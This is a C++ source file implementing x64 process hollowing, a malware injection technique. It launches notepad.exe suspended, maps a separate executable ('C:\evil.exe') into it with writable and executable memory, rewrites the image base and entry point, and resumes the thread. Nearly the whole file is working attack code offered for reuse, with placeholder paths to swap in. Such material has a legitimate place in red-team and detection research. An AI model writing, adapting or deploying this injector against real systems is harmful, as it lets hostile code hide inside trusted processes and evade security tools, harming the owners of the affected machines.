/*
Title: Process Hollowing (x64)
Resources:
	- https://github.com/m0n0ph1/Process-Hollowing
	- https://github.com/adamhlt/Process-Hollowing
*/

#include <Windows.h>
#include <winternl.h>
#include <stdio.h>

VOID FreeAll(LPVOID lpFileImage, LPPROCESS_INFORMATION lpPi) {
	if (lpPi->hThread)
		CloseHandle(lpPi->hThread);
	if (lpPi->hProcess)
		CloseHandle(lpPi->hProcess);
	if (lpFileImage)
		HeapFree(GetProcessHeap(), 0, lpFileImage);
}

LPVOID GetFileImage(const LPCSTR filePath) {
	HANDLE hFile = CreateFileA(filePath, GENERIC_READ, 0, nullptr, OPEN_EXISTING, 0, nullptr);
	if (!hFile) return FALSE;

	DWORD dwFileSize = GetFileSize(hFile, nullptr);
	if (dwFileSize == 0) {
		CloseHandle(hFile);
		return FALSE;
	}

	LPVOID lpFileImage = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwFileSize);
	if (!lpFileImage) {
		CloseHandle(hFile);
		return FALSE;
	}

	DWORD dwBytesRead = 0;
	if (!ReadFile(hFile, lpFileImage, dwFileSize, &dwBytesRead, nullptr)) {
		CloseHandle(hFile);
		HeapFree(GetProcessHeap(), 0, lpFileImage);
		return FALSE;
	}

	CloseHandle(hFile);

	return lpFileImage;
}

BOOL InjectPE(LPVOID lpFileImage, LPPROCESS_INFORMATION lpPi) {
	const auto lpImageDosHeader = (PIMAGE_DOS_HEADER)lpFileImage;
	const auto lpImageNtHeaders = (PIMAGE_NT_HEADERS)((ULONGLONG)lpImageDosHeader + lpImageDosHeader->e_lfanew);

	LPVOID lpAllocAddr = VirtualAllocEx(
		lpPi->hProcess,
		(LPVOID)lpImageNtHeaders->OptionalHeader.ImageBase,
		lpImageNtHeaders->OptionalHeader.SizeOfImage,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE
	);
	if (!lpAllocAddr) {
		FreeAll(lpFileImage, lpPi);
		return FALSE;
	}

	if (!WriteProcessMemory(lpPi->hProcess, lpAllocAddr, lpFileImage, lpImageNtHeaders->OptionalHeader.SizeOfHeaders, nullptr)) {
		FreeAll(lpFileImage, lpPi);
		return FALSE;
	}

	for (DWORD i = 0; i < lpImageNtHeaders->FileHeader.NumberOfSections; i++) {
		const auto lpImageSectionHeader = (PIMAGE_SECTION_HEADER)((ULONGLONG)lpImageNtHeaders + 4 + sizeof(IMAGE_FILE_HEADER) + lpImageNtHeaders->FileHeader.SizeOfOptionalHeader + (i * sizeof(IMAGE_SECTION_HEADER)));
		if (!WriteProcessMemory(
			lpPi->hProcess,
			(LPVOID)((UINT64)lpAllocAddr + lpImageSectionHeader->VirtualAddress),
			(LPVOID)((UINT64)lpFileImage + lpImageSectionHeader->PointerToRawData),
			lpImageSectionHeader->SizeOfRawData,
			nullptr
		)) {
			FreeAll(lpFileImage, lpPi);
			return FALSE;
		}
	}

	CONTEXT ctx = {};
	ctx.ContextFlags = CONTEXT_FULL;

	if (!GetThreadContext(lpPi->hThread, &ctx)) {
		FreeAll(lpFileImage, lpPi);
		return FALSE;
	}

	if (!WriteProcessMemory(lpPi->hProcess, (LPVOID)(ctx.Rdx + 0x10), &lpImageNtHeaders->OptionalHeader.ImageBase, sizeof(DWORD64), nullptr)) {
		FreeAll(lpFileImage, lpPi);
		return FALSE;
	}

	ctx.Rcx = (DWORD64)lpAllocAddr + lpImageNtHeaders->OptionalHeader.AddressOfEntryPoint;

	if (!SetThreadContext(lpPi->hThread, &ctx)) {
		FreeAll(lpFileImage, lpPi);
		return FALSE;
	}


	ResumeThread(lpPi->hThread);
}

BOOL ProcessHollowing() {
	LPCSTR evilPath = "C:\\evil.exe"; // Replace it with your own executable path to inject.
	LPCSTR targetPath = "C:\\Windows\\System32\\notepad.exe"; // Replace it with target process file to be injected.

	LPVOID lpFileImage = GetFileImage(evilPath);

	// Create a suspended process.
	STARTUPINFOA si;
	PROCESS_INFORMATION pi;

	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));

	if (!CreateProcessA(targetPath, nullptr, nullptr, nullptr, TRUE, CREATE_SUSPENDED, nullptr, nullptr, &si, &pi)) {
		FreeAll(lpFileImage, &pi);
		return FALSE;
	}

	//// Get the PEB base address.
	// LPVOID lpImageBaseAddr = nullptr;
	// CONTEXT ctx = {};
	// ctx.ContextFlags = CONTEXT_FULL;
	// GetThreadContext(pi.hThread, &ctx);
	// if (!ReadProcessMemory(pi.hProcess, (LPVOID)(ULONGLONG)(ctx.Rdx + 0x10), &lpImageBaseAddr, sizeof(DWORD), nullptr)) {
	// 	FreeAll(lpFileImage, &pi);
	// 	return FALSE;
	// }
	// LPVOID lpPEBAddr = (LPVOID)(ULONGLONG)ctx.Rdx;
	// if (!lpImageBaseAddr || !lpPEBAddr) {
	// 	FreeAll(lpFileImage, &pi);
	// 	return FALSE;
	// }

	InjectPE(lpFileImage, &pi);
	FreeAll(lpFileImage, &pi);

	return TRUE;
}
